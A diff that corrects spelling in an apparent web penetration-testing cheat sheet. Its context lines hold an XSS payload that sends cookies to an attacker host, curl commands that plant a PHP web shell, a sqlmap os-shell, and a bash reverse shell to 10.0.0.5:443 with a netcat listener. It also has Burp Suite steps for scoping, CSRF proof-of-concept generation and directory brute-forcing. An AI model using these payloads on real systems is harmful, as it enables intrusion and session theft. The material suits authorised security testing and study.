@@ -82,7 +82,7 @@ DOM-based XSS     Vulnerability exists in client-side code rather than server-si
 
 <iframe src="http://<attacker IP/test.js>" height="0" width="0"></iframe>
 <img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
-<script>new Image().src="http://<attaker IP>/test.php?output="+document.cookie;</script>
+<script>new Image().src="http://<attacker IP>/test.php?output="+document.cookie;</script>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Directory Traversal
@@ -129,7 +129,7 @@ os.system($decode);
 ?>
 
 curl -ikL -T shell.php http://target.com/shell.php
-Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution
+Once the file has been uploaded, pass Base64 encoded commands to it to get basic code execution
 
 - Method 2
 curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
@@ -224,7 +224,7 @@ sqlmap.py -r login.txt --force-ssl --batch --os-shell
 
 os-shell> bash -c "bash -i >& /dev/tcp/10.0.0.5/443 0>&1"
 
-kali:
+- Kali
 nc -lvpn 443
 python3 -V
 python3 -c 'import pty;pty.spawn("bash")'
@@ -347,7 +347,7 @@ Target > Site map:
 
 Proxy > Options > Intercept Client Requests:
     Enable URL and click Up to move to the top
-    Select File extension > Edit > copy the Match condifion > OK
+    Select File extension > Edit > copy the Match condition > OK
 
 Proxy > Options > Intercept Server Responses:
     Enable Intercept responses based on the following rules
@@ -395,7 +395,7 @@ Enter a name
 Tab > rename the file if needed > Next > Start Burp
 
 - Establish scope
-Proxy > turn off the Interncept
+Proxy > turn off the Intercept
 Open browser > browse to the target site
 Target > Site map: this should be populating
 Right click on the target URL > Add to scope
@@ -439,13 +439,13 @@ Enable In future, just copy the URL and don't show this dialog > Copy
 Open a new tab in Chromium and paste.
 Repeat as necessary.
 
-- Analyze anomolies
+- Analyze anomalies
 Filter bar > uncheck 4xx [request error]
 Click Status to sort by ascending.
 Select the first line with a 302 Status.
 Hold down shift and select the last line with a 302 Status.
 Right click > Delete selected items > Yes
-Review uncomman HTTP status codes (5xx) > Response > Render
+Review uncommon HTTP status codes (5xx) > Response > Render
 Sort by Length, review minimum and maximum values > Response > Render
 
 - Attack surface
@@ -553,7 +553,7 @@ Proxy > HTTP history > Filter bar > Filter by search term
 
 Right click on the first request > Engagement tools > Generate CSRF PoC
 Test in browser > Copy
-Open a new tab in Chroomium > paste
+Open a new tab in Chromium > paste
 Look for evidence that it executed whatever that HTTP request was supposed to do.
 
 https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
@@ -594,7 +594,7 @@ Right click > Report selected issues > Next 4x > enter file location > Next > Cl
 
 Right click on the very first request >  Send to intruder
 Clear
-Put your curser right after the / > click Add
+Put your cursor right after the / > click Add
 Payload Sets > Payload type: Runtime file
 Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
 Start attack
